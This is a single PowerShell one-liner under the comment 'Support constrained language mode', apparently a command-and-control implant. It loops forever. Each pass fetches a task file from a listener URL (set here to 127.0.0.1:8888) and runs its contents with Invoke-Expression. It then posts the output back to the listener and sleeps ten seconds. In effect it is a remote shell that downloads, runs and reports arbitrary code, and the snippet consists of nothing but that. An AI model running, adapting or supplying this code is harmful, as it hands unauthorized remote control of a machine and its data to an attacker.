# Support constrained language mode
$url="http://127.0.0.1:8888";while ($response = Invoke-WebRequest -Uri $($url + "/tasks.txt") -UseBasicParsing) {$results = Invoke-Expression $response.Content;Invoke-WebRequest -Method Post -Uri $url -Body $($results -join "`r`n") -ContentType "application/text" -UseBasicParsing > $null ;Start-Sleep -Seconds 10}